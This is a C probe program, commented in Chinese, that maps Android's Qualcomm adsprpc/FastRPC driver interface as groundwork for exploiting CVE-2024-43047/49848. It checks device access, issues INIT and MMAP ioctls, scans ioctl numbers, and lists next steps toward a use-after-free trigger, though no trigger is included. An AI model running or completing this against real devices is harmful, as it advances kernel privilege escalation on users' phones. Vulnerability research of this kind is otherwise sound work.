/*
 * adsprpc_mmap_probe.c - 深入探測 FASTRPC MMAP 功能
 *
 * 發現：
 * - MMAP (0xc0285206) 返回 errno=44 (Channel out of range)
 * - GETINFO_R (0xc0045208) 返回 errno=13 (Permission denied)
 *
 * 這表明需要先初始化 channel，然後才能使用 MMAP
 *
 * CVE-2024-43047/49848 攻擊路徑:
 * 1. 透過 fastrpc_internal_mmap 建立映射
 * 2. 觸發 map collision 或 KEEP_MAP 邏輯漏洞
 * 3. 獲得 UAF 條件
 *
 * 編譯:
 * aarch64-linux-android31-clang -static -O2 -o adsprpc_mmap_probe adsprpc_mmap_probe.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>

/*
 * 正確的 FASTRPC IOCTL 定義
 * 基於 adsprpc 驅動源碼分析
 */

/* 已確認有效的 ioctl 命令 */
#define FASTRPC_IOCTL_MMAP 0xc0285206    // errno=44 - 需要正確的 channel
#define FASTRPC_IOCTL_GETINFO 0xc0045208 // errno=13 - 需要權限

/* 其他可能的命令 */
#define FASTRPC_IOCTL_INVOKE 0xc0485201
#define FASTRPC_IOCTL_INIT 0xc0185203
#define FASTRPC_IOCTL_INIT_ATTRS 0xc0205204
#define FASTRPC_IOCTL_MUNMAP 0xc0185207
#define FASTRPC_IOCTL_CONTROL 0xc0085209
#define FASTRPC_IOCTL_MEM_MAP 0xc028520a
#define FASTRPC_IOCTL_MEM_UNMAP 0xc018520b
#define FASTRPC_IOCTL_GET_DSP_INFO 0xc00c520d

/* DSP domains */
#define ADSP_DOMAIN_ID 0 // Audio DSP
#define MDSP_DOMAIN_ID 1 // Modem DSP
#define SDSP_DOMAIN_ID 2 // Sensors DSP
#define CDSP_DOMAIN_ID 3 // Compute DSP

/* FASTRPC flags */
#define FASTRPC_INIT_ATTACH 0
#define FASTRPC_INIT_CREATE 1
#define FASTRPC_INIT_CREATE_STATIC 2

/* fastrpc_ioctl_init 結構 (嘗試不同版本) */
struct fastrpc_ioctl_init_v1
{
    uint32_t flags;   /* FASTRPC_INIT_* */
    uint32_t file;    /* ELF file address */
    uint32_t filelen; /* length of file */
    int32_t filefd;   /* fd of shared memory */
    uint32_t mem;     /* unused, set to 0 */
};

/* 較新版本的 init 結構 */
struct fastrpc_ioctl_init_attrs
{
    uint32_t flags;   /* FASTRPC_INIT_* */
    uint32_t file;    /* ELF file address */
    uint32_t filelen; /* length of file */
    int32_t filefd;   /* fd of shared memory */
    uint32_t mem;     /* unused */
    int32_t memfd;    /* unused */
    uint32_t memlen;  /* unused */
    uint32_t attrs;   /* attributes */
    uint32_t siglen;  /* signature length */
};

/* MMAP 結構 */
struct fastrpc_ioctl_mmap
{
    int32_t fd;        /* ion fd */
    uint32_t flags;    /* flags */
    uint64_t vaddrin;  /* virtual address in */
    uint64_t size;     /* size */
    uint64_t vaddrout; /* virtual address out */
};

/* MUNMAP 結構 */
struct fastrpc_ioctl_munmap
{
    uint64_t vaddrout; /* virtual address out */
    uint64_t size;     /* size */
};

/* GETINFO 結構 */
struct fastrpc_ioctl_info
{
    uint32_t domain;
    uint32_t attribute_ID;
    uint32_t capability;
};

/* CONTROL 結構 */
struct fastrpc_ctrl_latency
{
    uint32_t req;     /* request type */
    uint32_t enable;  /* enable/disable */
    uint32_t latency; /* latency value */
};

void test_init_attach(int fd)
{
    printf("\n[*] Testing INIT_ATTACH on different domains...\n");

    // 嘗試不同的初始化結構和 domain
    for (int domain = 0; domain <= 3; domain++)
    {
        struct fastrpc_ioctl_init_v1 init = {0};
        init.flags = FASTRPC_INIT_ATTACH; // Attach to existing DSP
        init.file = 0;
        init.filelen = 0;
        init.filefd = -1;
        init.mem = domain; // 有時候 domain 在這裡傳遞

        errno = 0;
        int ret = ioctl(fd, FASTRPC_IOCTL_INIT, &init);
        printf("  Domain %d (INIT 0xc0185203): ret=%d, errno=%d (%s)\n",
               domain, ret, errno, ret < 0 ? strerror(errno) : "OK");

        // 嘗試 INIT_ATTRS
        struct fastrpc_ioctl_init_attrs init_attrs = {0};
        init_attrs.flags = FASTRPC_INIT_ATTACH;
        init_attrs.filefd = -1;
        init_attrs.attrs = domain;

        errno = 0;
        ret = ioctl(fd, FASTRPC_IOCTL_INIT_ATTRS, &init_attrs);
        printf("  Domain %d (INIT_ATTRS 0xc0205204): ret=%d, errno=%d (%s)\n",
               domain, ret, errno, ret < 0 ? strerror(errno) : "OK");
    }
}

void test_mmap_with_params(int fd)
{
    printf("\n[*] Testing MMAP with various parameters...\n");

    // 嘗試不同的 MMAP 參數組合
    struct fastrpc_ioctl_mmap mmap_req = {0};

    // 嘗試 1: 簡單的 mmap
    mmap_req.fd = -1; // 無 ION fd
    mmap_req.flags = 0;
    mmap_req.vaddrin = 0;
    mmap_req.size = 4096;
    mmap_req.vaddrout = 0;

    errno = 0;
    int ret = ioctl(fd, FASTRPC_IOCTL_MMAP, &mmap_req);
    printf("  fd=-1, size=4096: ret=%d, errno=%d (%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "OK");

    // 嘗試 2: 使用 /dev/ion (如果存在)
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd >= 0)
    {
        printf("  [+] /dev/ion opened: fd=%d\n", ion_fd);

        mmap_req.fd = ion_fd;
        mmap_req.flags = 0;
        mmap_req.vaddrin = 0;
        mmap_req.size = 4096;
        mmap_req.vaddrout = 0;

        errno = 0;
        ret = ioctl(fd, FASTRPC_IOCTL_MMAP, &mmap_req);
        printf("  fd=ion, size=4096: ret=%d, errno=%d (%s)\n",
               ret, errno, ret < 0 ? strerror(errno) : "OK");

        close(ion_fd);
    }
    else
    {
        printf("  [-] /dev/ion not accessible: %s\n", strerror(errno));
    }

    // 嘗試 3: 使用 dmabuf heap (新的 API)
    int dmabuf_fd = open("/dev/dma_heap/system", O_RDWR);
    if (dmabuf_fd >= 0)
    {
        printf("  [+] /dev/dma_heap/system opened: fd=%d\n", dmabuf_fd);
        close(dmabuf_fd);
    }

    // 嘗試用 memfd
    int memfd = syscall(319, "fastrpc_test", 0); // memfd_create
    if (memfd >= 0)
    {
        ftruncate(memfd, 4096);

        mmap_req.fd = memfd;
        mmap_req.flags = 0;
        mmap_req.vaddrin = 0;
        mmap_req.size = 4096;
        mmap_req.vaddrout = 0;

        errno = 0;
        ret = ioctl(fd, FASTRPC_IOCTL_MMAP, &mmap_req);
        printf("  fd=memfd, size=4096: ret=%d, errno=%d (%s)\n",
               ret, errno, ret < 0 ? strerror(errno) : "OK");

        close(memfd);
    }
}

void test_other_adsprpc_devices(void)
{
    printf("\n[*] Testing other ADSPRPC devices...\n");

    const char *devices[] = {
        "/dev/adsprpc-smd-secure",
        "/dev/adsprpc-smd1",
        "/dev/adsprpc-cdsp",
        "/dev/adsprpc-mdsp",
        "/dev/adsprpc-sdsp",
        "/dev/fastrpc-cdsp",
        "/dev/fastrpc-adsp",
        "/dev/fastrpc-sdsp",
        "/dev/fastrpc-mdsp",
        NULL};

    for (int i = 0; devices[i] != NULL; i++)
    {
        int fd_read = open(devices[i], O_RDONLY);
        if (fd_read >= 0)
        {
            printf("  [+] %s: ACCESSIBLE (fd=%d)\n", devices[i], fd_read);

            // 嘗試一下 GETINFO
            uint32_t info = 0;
            errno = 0;
            int ret = ioctl(fd_read, FASTRPC_IOCTL_GETINFO, &info);
            printf("      GETINFO: ret=%d, errno=%d\n", ret, errno);

            close(fd_read);
        }
        else
        {
            printf("  [-] %s: %s\n", devices[i], strerror(errno));
        }

        // 也嘗試 O_RDWR
        int fd_write = open(devices[i], O_RDWR);
        if (fd_write >= 0)
        {
            printf("  [!] %s O_RDWR: ACCESSIBLE! fd=%d\n", devices[i], fd_write);
            close(fd_write);
        }
    }
}

void scan_ioctl_deep(int fd)
{
    printf("\n[*] Deep scanning ioctl commands (looking for non-ENOTTY responses)...\n");

    char buf[4096] = {0};

    // 基於 52XX 掃描 (0x52 = 'R' 可能是 fastrpc 的 magic)
    printf("  Scanning 0xc0XX5200-0xc0XX5220 range...\n");

    // 不同大小的結構
    unsigned int size_prefixes[] = {
        0xc0040000, // 4 bytes
        0xc0080000, // 8 bytes
        0xc00c0000, // 12 bytes
        0xc0100000, // 16 bytes
        0xc0140000, // 20 bytes
        0xc0180000, // 24 bytes
        0xc01c0000, // 28 bytes
        0xc0200000, // 32 bytes
        0xc0280000, // 40 bytes
        0xc0400000, // 64 bytes
        0xc0480000, // 72 bytes
        0};

    for (int p = 0; size_prefixes[p] != 0; p++)
    {
        for (int n = 0x5200; n <= 0x5220; n++)
        {
            unsigned int cmd = size_prefixes[p] | n;
            memset(buf, 0, sizeof(buf));

            errno = 0;
            int ret = ioctl(fd, cmd, buf);

            // 只顯示非 ENOTTY 錯誤
            if (errno != 25)
            { // ENOTTY = 25
                printf("    [!] ioctl(0x%08x): ret=%d, errno=%d (%s)\n",
                       cmd, ret, errno, strerror(errno));
            }
        }
    }
}

void check_selinux_context(void)
{
    printf("\n[*] Checking SELinux context...\n");

    // 讀取當前進程的 SELinux context
    char context[256] = {0};
    int fd = open("/proc/self/attr/current", O_RDONLY);
    if (fd >= 0)
    {
        ssize_t n = read(fd, context, sizeof(context) - 1);
        if (n < 0)
        {
            fprintf(stderr, "[-] Failed to read context: %s\n", strerror(errno));
        }
        else
        {
            context[n] = '\0';
            // Remove trailing newline often present in procfs nodes
            context[strcspn(context, "\n")] = '\0'; 
            printf("  Current process context: %s\n", context);
        }
        close(fd);
    }
    else
    {
        fprintf(stderr, "[-] Failed to open /proc/self/attr/current: %s\n", strerror(errno));
    }

    // 檢查 adsprpc-smd 的 context
    fd = open("/sys/class/misc/adsprpc-smd/device/uevent", O_RDONLY);
    if (fd >= 0)
    {
        char uevent[1024] = {0};
        ssize_t n = read(fd, uevent, sizeof(uevent) - 1);
        if (n < 0)
        {
            fprintf(stderr, "[-] Failed to read uevent: %s\n", strerror(errno));
        }
        else
        {
            uevent[n] = '\0';
            // Remove trailing newline
            uevent[strcspn(uevent, "\n")] = '\0';
            printf("  adsprpc-smd uevent: %s\n", uevent);
        }
        close(fd);
    }
    else
    {
        fprintf(stderr, "[-] Failed to open /sys/class/misc/adsprpc-smd/device/uevent: %s\n", strerror(errno));
    }
}

void enumerate_dsp_processes(void)
{
    printf("\n[*] DSP-related processes:\n");

    // 這裡只是展示應該在設備上執行的命令
    printf("  Run: ps -ef | grep -E 'dsp|adsp|cdsp|sdsp|fastrpc'\n");
    printf("  Run: ls -la /dev/*dsp* /dev/*fastrpc* 2>/dev/null\n");
}

int main(int argc, char **argv)
{
    printf("=== ADSPRPC MMAP Probe ===\n");
    printf("Targeting CVE-2024-43047/49848 exploitation path\n");
    printf("===========================\n");

    // 檢查 SELinux
    check_selinux_context();

    // 枚舉其他 ADSPRPC 設備
    test_other_adsprpc_devices();

    // 打開主設備
    printf("\n[*] Opening /dev/adsprpc-smd O_RDONLY...\n");
    int fd = open("/dev/adsprpc-smd", O_RDONLY);
    if (fd < 0)
    {
        printf("[-] Failed to open: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Success: fd=%d\n", fd);

    // 測試初始化
    test_init_attach(fd);

    // 測試 MMAP
    test_mmap_with_params(fd);

    // 深度掃描 ioctl
    scan_ioctl_deep(fd);

    // 展示相關進程資訊
    enumerate_dsp_processes();

    printf("\n=== Analysis ===\n");
    printf("Key findings:\n");
    printf("- MMAP (0xc0285206) errno=44: Need correct channel initialization\n");
    printf("- GETINFO (0xc0045208) errno=13: Permission denied (need write access)\n");
    printf("\n");
    printf("Next steps:\n");
    printf("1. Try to get fd from dspservice via HWBinder\n");
    printf("2. Or find another device with write access\n");
    printf("3. Once we have proper access, trigger UAF via map collision\n");

    close(fd);
    return 0;
}
